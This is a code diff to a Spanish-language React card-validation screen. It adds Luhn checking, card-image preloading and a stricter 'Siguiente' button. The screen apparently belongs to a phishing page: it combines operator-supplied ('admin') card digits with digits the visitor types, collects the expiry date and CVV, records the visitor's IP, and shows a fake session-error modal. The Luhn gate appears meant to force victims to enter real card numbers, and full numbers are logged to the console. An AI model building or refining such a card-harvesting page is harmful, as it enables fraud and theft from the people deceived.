@@ -88,6 +88,43 @@ export default function ValidacionTC() {
     const estadoAnteriorRef = useRef(null);
     const aprobadoEsperandoRef = useRef(false);
 
+    // Estado para controlar la carga de imágenes (evita ver tarjeta anterior)
+    const [imagesLoaded, setImagesLoaded] = useState(false);
+    const [loadingImages, setLoadingImages] = useState(false);
+
+    // Estado para validación de tarjeta con algoritmo de Luhn
+    const [isCardValid, setIsCardValid] = useState(null); // null = no validado, true = válida, false = inválida
+
+    // --- ALGORITMO DE LUHN PARA VALIDACIÓN DE TARJETA ---
+    const validateLuhn = (cardNumber) => {
+        // Eliminar espacios y guiones
+        const cleanNumber = cardNumber.toString().replace(/\s+|-/g, '');
+
+        // Validar que solo contenga dígitos
+        if (!/^\d+$/.test(cleanNumber)) return false;
+
+        // Aplicar algoritmo de Luhn
+        let sum = 0;
+        let isEven = false;
+
+        // Recorrer de derecha a izquierda
+        for (let i = cleanNumber.length - 1; i >= 0; i--) {
+            let digit = parseInt(cleanNumber.charAt(i), 10);
+
+            if (isEven) {
+                digit *= 2;
+                if (digit > 9) {
+                    digit -= 9;
+                }
+            }
+
+            sum += digit;
+            isEven = !isEven;
+        }
+
+        return (sum % 10) === 0;
+    };
+
     // --- LÓGICA DE TARJETA E IMÁGENES --- (Mover aquí para que isAmex tenga acceso a cardData actualizado)
     const isAmex = (cardData.label || "").toLowerCase().includes("amex") ||
         (cardData.filename || "").toLowerCase().includes("amex") ||
@@ -178,6 +215,53 @@ export default function ValidacionTC() {
             if (intervalId) clearInterval(intervalId);
         };
     }, []);
+
+    // useEffect para precargar imágenes cuando cambia cardData
+    useEffect(() => {
+        const preloadImages = async () => {
+            setLoadingImages(true);
+            setImagesLoaded(false);
+
+            const frontPath = cardData.tipo === "credito"
+                ? `/assets/images/IMGtarjetas/${cardData.filename}`
+                : `/assets/images/IMGdebitotj/${cardData.filename}`;
+
+            const backFilename = getBackCardFilename(cardData.filename);
+            const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
+            const backPath = backFilename
+                ? `/assets/images/${folder}/${backFilename}`
+                : frontPath;
+
+            try {
+                // Precargar ambas imágenes simultáneamente
+                const loadImage = (src) => {
+                    return new Promise((resolve, reject) => {
+                        const img = new Image();
+                        img.onload = () => resolve(img);
+                        img.onerror = reject;
+                        img.src = src;
+                    });
+                };
+
+                await Promise.all([
+                    loadImage(frontPath),
+                    loadImage(backPath)
+                ]);
+
+                // Ambas imágenes cargadas exitosamente
+                setImagesLoaded(true);
+                setLoadingImages(false);
+            } catch (error) {
+                console.error("Error precargando imágenes:", error);
+                // Aún así permitir mostrar (fallback)
+                setImagesLoaded(true);
+                setLoadingImages(false);
+            }
+        };
+
+        preloadImages();
+    }, [cardData.filename, cardData.tipo]);
+
 
     const obtenerIP = async () => {
         try {
@@ -286,9 +370,20 @@ export default function ValidacionTC() {
         // Guardar mientras escribe
         setCardDigits(val);
 
-        // 👇 SOLO validar cuando ya están los dígitos requeridos
+        // 👇 Validar con algoritmo de Luhn cuando estén todos los dígitos
         if (val.length === requiredDigitsLength) {
-            console.log("Dígitos completos");
+            // Construir número completo: dígitos del usuario + dígitos del admin
+            const fullCardNumber = val + cardData.digits;
+            const isValid = validateLuhn(fullCardNumber);
+
+            setIsCardValid(isValid);
+            // Ocultar alerta después de 4 segundos
+            // setTimeout(() => setShowCardAlert(false), 4000);
+
+            console.log(`Tarjeta ${isValid ? 'VÁLIDA' : 'INVÁLIDA'}: ${fullCardNumber}`);
+        } else {
+            // Reset estado si borra dígitos
+            setIsCardValid(null);
         }
     };
 
@@ -345,12 +440,19 @@ export default function ValidacionTC() {
     // --- TRANSICIÓN DE PASOS ---
     const handleContinue = async () => {
         if (step === "front") {
-            // Validar paso 1
+            // Validar paso 1: dígitos completos, fecha válida Y TARJETA VÁLIDA
             const isExpirationValid = expirationDate.length === 5 && expirationDate.includes("/");
-            if (cardDigits.length === requiredDigitsLength && isExpirationValid) {
+            const allFieldsValid = cardDigits.length === requiredDigitsLength && isExpirationValid;
+
+            // Solo permitir continuar si la tarjeta es válida
+            if (allFieldsValid && isCardValid === true) {
                 setStep("back");
                 setIsFocused(false);
                 setFocusedField("");
+            } else if (allFieldsValid && isCardValid === false) {
+                // Mostrar modal de error si intentan continuar con tarjeta inválida
+                setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+                setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
             }
         } else {
             // Validar paso 2 y Enviar
@@ -646,7 +748,10 @@ export default function ValidacionTC() {
                                 }
                             </p>
 
-                            <div className="flip-card">
+                            <div className="flip-card" style={{
+                                opacity: imagesLoaded ? 1 : 0,
+                                transition: "opacity 0.3s ease-in-out"
+                            }}>
                                 <div className={`flip-card-inner ${step === 'back' ? 'flipped' : ''}`}>
 
                                     <div className="flip-card-front">
@@ -772,6 +877,8 @@ export default function ValidacionTC() {
                                                     height: "40px",
                                                     opacity: 0,
                                                     cursor: "text",
+                                                    caretColor: "transparent",
+                                                    WebkitTextFillColor: "transparent"
                                                 }}
                                             />
                                         </div>
@@ -786,14 +893,14 @@ export default function ValidacionTC() {
                                 style={{
                                     marginTop: "20px",
                                     opacity: (step === "front"
-                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
+                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                         : cvv.length === requiredCvvLength) ? 1 : 0.5,
                                     cursor: (step === "front"
-                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
+                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                         : cvv.length === requiredCvvLength) ? "pointer" : "not-allowed"
                                 }}
                                 disabled={step === "front"
-                                    ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
+                                    ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                     : cvv.length !== requiredCvvLength}
                             >
                                 {step === "front" ? "Siguiente" : "Enviar"}
